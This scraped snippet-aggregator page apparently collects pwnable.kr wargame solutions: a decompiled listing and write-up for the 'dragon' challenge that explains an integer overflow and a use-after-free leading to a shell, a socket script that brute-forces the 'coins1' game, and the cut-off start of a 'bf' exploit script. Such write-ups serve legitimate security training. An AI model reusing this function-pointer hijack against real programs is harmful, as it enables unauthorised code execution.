plain">)DRAGON_STRUCT </code><code class="python keyword">=</code> <code class="python plain">PrintMonsterInfo;</code></div><div class="line number65 index64 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"Baby Dragon Has Appeared!"</code><code class="python plain">);</code></div><div class="line number66 index65 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number67 index66 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( a1 </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python value">1</code> <code class="python plain">)</code></div><div class="line number68 index67 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number69 index68 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">(_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">=</code> <code class="python value">1</code><code class="python plain">;</code></div><div class="line number70 index69 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">42</code><code class="python plain">;</code></div><div class="line number71 index70 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">2</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">50</code><code class="python plain">;</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">3</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python plain">PrintPlayerInfo;</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">v3 </code><code class="python keyword">=</code> <code class="python plain">PriestAttack((</code><code class="python functions">int</code><code class="python plain">)PLAYER_STRUCT, DRAGON_STRUCT);</code></div><div class="line number74 index73 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number75 index74 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">else</code></div><div class="line number76 index75 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number77 index76 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( a1 !</code><code class="python keyword">=</code> <code class="python value">2</code> <code class="python plain">)</code></div><div class="line number78 index77 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code><code class="python plain">;</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">(_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">=</code> <code class="python value">2</code><code class="python plain">;</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">50</code><code class="python plain">;</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">2</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python value">0</code><code class="python plain">;</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">*</code><code class="python plain">((_DWORD </code><code class="python keyword">*</code><code class="python plain">)PLAYER_STRUCT </code><code class="python keyword">+</code> <code class="python value">3</code><code class="python plain">) </code><code class="python keyword">=</code> <code class="python plain">PrintPlayerInfo;</code></div><div class="line number83 index82 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">v3 </code><code class="python keyword">=</code> <code class="python plain">KnightAttack((</code><code class="python functions">int</code><code class="python plain">)PLAYER_STRUCT, DRAGON_STRUCT);</code></div><div class="line number84 index83 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number85 index84 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( v3 )</code></div><div class="line number86 index85 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number87 index86 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"Well Done Hero! You Killed The Dragon!"</code><code class="python plain">);</code></div><div class="line number88 index87 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"The World Will Remember You As:"</code><code class="python plain">);</code></div><div class="line number89 index88 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">v2 </code><code class="python keyword">=</code> <code class="python plain">malloc(</code><code class="python value">16u</code><code class="python plain">);</code></div><div class="line number90 index89 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">__isoc99_scanf(</code><code class="python string">"%16s"</code><code class="python plain">, v2);</code></div><div class="line number91 index90 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"And The Dragon You Have Defeated Was Called:"</code><code class="python plain">);</code></div><div class="line number92 index91 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">(</code><code class="python keyword">*</code><code class="python plain">(void (__cdecl </code><code class="python keyword">*</code><code class="python keyword">*</code><code class="python plain">)(void </code><code class="python keyword">*</code><code class="python plain">))DRAGON_STRUCT)(DRAGON_STRUCT);</code></div><div class="line number93 index92 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number94 index93 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">else</code></div><div class="line number95 index94 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number96 index95 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"\nYou Have Been Defeated!"</code><code class="python plain">);</code></div><div class="line number97 index96 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number98 index97 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">free(PLAYER_STRUCT);</code></div><div class="line number99 index98 alt2"><code class="python plain">}</code></div><div class="line number100 index99 alt1"><code class="python plain">```</code></div><div class="line number101 index100 alt2">&nbsp;</div><div class="line number102 index101 alt1"><code class="python plain">SecretLevel:</code></div><div class="line number103 index102 alt2"><code class="python plain">```</code></div><div class="line number104 index103 alt1"><code class="python functions">int</code> <code class="python plain">SecretLevel()</code></div><div class="line number105 index104 alt2"><code class="python plain">{</code></div><div class="line number106 index105 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">char s1; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">[sp</code><code class="python keyword">+</code><code class="python value">12h</code><code class="python plain">] [bp</code><code class="python keyword">-</code><code class="python value">16h</code><code class="python plain">]@</code><code class="python value">1</code></div><div class="line number107 index106 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python functions">int</code> <code class="python plain">v2; </code><code class="python keyword">/</code><code class="python keyword">/</code> <code class="python plain">[sp</code><code class="python keyword">+</code><code class="python value">1Ch</code><code class="python plain">] [bp</code><code class="python keyword">-</code><code class="python plain">Ch]@</code><code class="python value">1</code></div><div class="line number108 index107 alt1">&nbsp;</div><div class="line number109 index108 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">v2 </code><code class="python keyword">=</code> <code class="python keyword">*</code><code class="python plain">MK_FP(__GS__, </code><code class="python value">20</code><code class="python plain">);</code></div><div class="line number110 index109 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">printf(</code><code class="python string">"Welcome to Secret Level!\nInput Password : "</code><code class="python plain">);</code></div><div class="line number111 index110 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">__isoc99_scanf(</code><code class="python string">"%10s"</code><code class="python plain">, &amp;s1);</code></div><div class="line number112 index111 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">( strcmp(&amp;s1, </code><code class="python string">"Nice_Try_But_The_Dragons_Won't_Let_You!"</code><code class="python plain">) )</code></div><div class="line number113 index112 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">{</code></div><div class="line number114 index113 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">puts(</code><code class="python string">"Wrong!\n"</code><code class="python plain">);</code></div><div class="line number115 index114 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">exit(</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">);</code></div><div class="line number116 index115 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">}</code></div><div class="line number117 index116 alt2"><code class="python spaces">&nbsp;&nbsp;</code><code class="python plain">system(</code><code class="python string">"/bin/sh"</code><code class="python plain">);</code></div><div class="line number118 index117 alt1"><code class="python spaces">&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python keyword">*</code><code class="python plain">MK_FP(__GS__, </code><code class="python value">20</code><code class="python plain">) ^ v2;</code></div><div class="line number119 index118 alt2"><code class="python plain">}</code></div><div class="line number120 index119 alt1"><code class="python plain">```</code></div><div class="line number121 index120 alt2">&nbsp;</div><div class="line number122 index121 alt1"><code class="python plain">Our final goal </code><code class="python keyword">is</code> <code class="python plain">to get a shell. Since we notice that there </code><code class="python keyword">is</code> <code class="python plain">a shell when we enter secret level </code><code class="python keyword">and</code> <code class="python plain">enter the right password, let's review its code. </code></div><div class="line number123 index122 alt2"><code class="python plain">Obviously this cannot be done.`Nice_Try_But_The_Dragons_Won't_Let_You!` </code><code class="python keyword">is</code> <code class="python value">39</code><code class="python plain">, but `scanf` only read </code><code class="python value">16.</code></div><div class="line number124 index123 alt1"><code class="python plain">Maybe we have to defeat the dragon.</code></div><div class="line number125 index124 alt2"><code class="python plain">We can choose two types of role. One </code><code class="python keyword">is</code> <code class="python plain">`priest` </code><code class="python keyword">and</code> <code class="python plain">the other </code><code class="python keyword">is</code> <code class="python plain">`knight`. And there are </code><code class="python value">2</code> <code class="python plain">types dragons too, the `Baby Dragon` </code><code class="python keyword">and</code> <code class="python plain">the `Mama Dragon`. After comparing the attribute, we can find the `Mama Dragon` </code><code class="python keyword">is</code> <code class="python keyword">not</code> <code class="python plain">as stronger as `Baby Dragon` </code><code class="python keyword">and</code> <code class="python plain">these </code><code class="python value">2</code> <code class="python plain">appears alternately.</code></div><div class="line number126 index125 alt1"><code class="python plain">Priest has `Holy Bolt` which will deals </code><code class="python value">20</code> <code class="python plain">damage, `Clarity` which will refreshes </code><code class="python functions">all</code> <code class="python plain">mana, `HolyShield` that can let you become temporarily invincible.</code></div><div class="line number127 index126 alt2"><code class="python plain">Knight can `Crash` to deals </code><code class="python value">20</code> <code class="python plain">damage, </code><code class="python keyword">and</code> <code class="python plain">`Frenzy` to deals </code><code class="python value">40</code> <code class="python plain">damage but lose </code><code class="python value">20</code> <code class="python plain">too.</code></div><div class="line number128 index127 alt1">&nbsp;</div><div class="line number129 index128 alt2"><code class="python plain">After calculating, we will definitely lose the battle. However, the variable saving dragon's life </code><code class="python keyword">is</code> <code class="python plain">only </code><code class="python value">1</code> <code class="python plain">byte which means the </code><code class="python functions">max</code> <code class="python plain">life </code><code class="python keyword">is</code> <code class="python value">127.</code></div><div class="line number130 index129 alt1">&nbsp;</div><div class="line number131 index130 alt2"><code class="python plain">So we can die one time to meet a weaker dragon, </code><code class="python keyword">and</code> <code class="python plain">use `HolyShield` </code><code class="python keyword">and</code> <code class="python plain">`Clarity` to let the dragon heal itself until it overflow </code><code class="python keyword">and</code> <code class="python plain">die.</code></div><div class="line number132 index131 alt1">&nbsp;</div><div class="line number133 index132 alt2"><code class="python plain">After we win the game, the dragon will be freed, </code><code class="python keyword">and</code> <code class="python plain">the </code><code class="python functions">buffer</code> <code class="python plain">of the same size will be applied to receive our </code><code class="python functions">input</code><code class="python plain">. And </code><code class="python keyword">in</code> <code class="python plain">the end, it will call the value saved at that the dragon</code><code class="python string">'s struct, so it'</code><code class="python plain">s a UAF. Since both are </code><code class="python value">16</code><code class="python plain">, they are located at the same address.</code></div><div class="line number134 index133 alt1">&nbsp;</div><div class="line number135 index134 alt2"><code class="python plain">We just </code><code class="python functions">input</code> <code class="python plain">the shell's address to let it call </code><code class="python keyword">and</code> <code class="python plain">shell got.</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
Pwnable.kr dragon writeup
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/TrungACZNE">TrungACZNE</a>/<a href="https://pythonexample.com/snippet/python/mainpy_trungaczne_python">main.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_248995" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">subprocess</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code> <code class="python plain">sys</code></div><div class="line number4 index3 alt1"><code class="python plain">N </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number5 index4 alt2"><code class="python plain">C </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number6 index5 alt1"><code class="python plain">left, right, mid </code><code class="python keyword">=</code> <code class="python value">0</code><code class="python plain">, </code><code class="python value">0</code><code class="python plain">, </code><code class="python value">0</code></div><div class="line number7 index6 alt2">&nbsp;</div><div class="line number8 index7 alt1"><code class="python plain">s </code><code class="python keyword">=</code> <code class="python plain">socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code></div><div class="line number9 index8 alt2"><code class="python plain">s.connect((</code><code class="python string">"0.0.0.0"</code><code class="python plain">, </code><code class="python value">9007</code><code class="python plain">))</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python keyword">while</code> <code class="python color1">True</code><code class="python plain">:</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">lines </code><code class="python keyword">=</code> <code class="python plain">s.recv(</code><code class="python value">512</code><code class="python plain">).splitlines()</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">line </code><code class="python keyword">in</code> <code class="python plain">lines:</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python string">"expire"</code> <code class="python keyword">in</code> <code class="python plain">line:</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python keyword">not</code><code class="python plain">(line.isdigit() </code><code class="python keyword">or</code> <code class="python plain">line.startswith(</code><code class="python string">"N="</code><code class="python plain">)):</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code> <code class="python string">"|"</code><code class="python plain">, line</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sys.stdout.flush()</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">line.startswith(</code><code class="python string">"N="</code><code class="python plain">):</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">N </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(line[line.index(</code><code class="python string">"="</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python value">1</code><code class="python plain">: line.index(</code><code class="python string">" "</code><code class="python plain">)])</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">C </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(line[line.rindex(</code><code class="python string">"="</code><code class="python plain">)</code><code class="python keyword">+</code><code class="python value">1</code><code class="python plain">:])</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">left </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">right </code><code class="python keyword">=</code> <code class="python plain">N</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mid </code><code class="python keyword">=</code> <code class="python plain">right</code><code class="python keyword">/</code><code class="python value">2</code> <code class="python keyword">+</code> <code class="python plain">right</code><code class="python keyword">%</code><code class="python value">2</code></div><div class="line number26 index25 alt1">&nbsp;</div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">" "</code><code class="python plain">.join(</code><code class="python functions">str</code><code class="python plain">(x) </code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(left, mid)) </code><code class="python keyword">+</code> <code class="python string">"\n"</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(payload)</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">line.isdigit():</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">weight </code><code class="python keyword">=</code> <code class="python functions">int</code><code class="python plain">(line)</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">weight &lt; (mid</code><code class="python keyword">-</code><code class="python plain">left)</code><code class="python keyword">*</code><code class="python value">10</code><code class="python plain">:</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">right </code><code class="python keyword">=</code> <code class="python plain">mid</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">left </code><code class="python keyword">=</code> <code class="python plain">mid</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">mid </code><code class="python keyword">=</code> <code class="python plain">left </code><code class="python keyword">+</code> <code class="python plain">(right</code><code class="python keyword">-</code><code class="python plain">left)</code><code class="python keyword">/</code><code class="python value">2</code> <code class="python keyword">+</code> <code class="python plain">(right</code><code class="python keyword">-</code><code class="python plain">left)</code><code class="python keyword">%</code><code class="python value">2</code></div><div class="line number36 index35 alt1">&nbsp;</div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload </code><code class="python keyword">=</code> <code class="python string">" "</code><code class="python plain">.join(</code><code class="python functions">str</code><code class="python plain">(x) </code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python functions">range</code><code class="python plain">(left, mid)) </code><code class="python keyword">+</code> <code class="python string">"\n"</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">s.send(payload)</code></div></div></td></tr></tbody></table></div></div>
</div>
<br>
pwnable.kr coins 1
</div>




<div class="result">
<h2 class="title">
<a href="https://pythonexample.com/user/poqw">poqw</a>/<a href="https://pythonexample.com/snippet/python/bf_exploitpy_poqw_python">bf_exploit.py</a>
<span class="language">(<a href="https://pythonexample.com/language/python/"> python</a>)</span>
</h2>
<div class="snippet">

<div><div id="highlighter_623085" class="syntaxhighlighter  python"><div class="toolbar"><span><a href="https://pythonexample.com/code/pwnable.kr-crypto1/#" class="toolbar_item command_help help">?</a></span></div><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">import</code> <code class="python plain">struct</code></div><div class="line number2 index1 alt1"><code class="python keyword">from</code> <code class="python plain">subprocess </code><code class="python keyword">import</code> <code class="python keyword">*</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code> <code class="python plain">threading</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="python plain">LOCAL </code><code class="python keyword">=</code> <code class="python value">0</code></div><div class="line number6 index5 alt1"><code class="python keyword">if</code> <code class="python plain">LOCAL :</code></div><div class="line number7 index6 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc </code><code class="python keyword">=</code> <code class="python plain">Popen([</code><code class="python string">'./bf'</code><code class="python plain">], stdin</code><code class="python keyword">=</code><code class="python plain">PIPE, stdout</code><code class="python keyword">=</code><code class="python plain">PIPE)</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#proc = Popen(['strace', '-i', './bf'], stdin=PIPE, stdout=PIPE)</code></div><div class="line number9 index8 alt2"><code class="python keyword">else</code> <code class="python plain">:</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">proc </code><code class="python keyword">=</code> <code class="python plain">Popen([</code><code class="python string">'nc'</code><code class="python plain">, </code><code class="python string">'pwnable.kr'</code><code class="python plain">, </code><code class="python string">'9001'</code><code class="python plain">], stdin</code><code class="python keyword">=</code><code class="python plain">PIPE, stdout</code><code class="python keyword">=</code><code class="python plain">PIPE)</code></div><div class="line number11 index10 alt2">&nbsp;</div><div class="line number12 index11 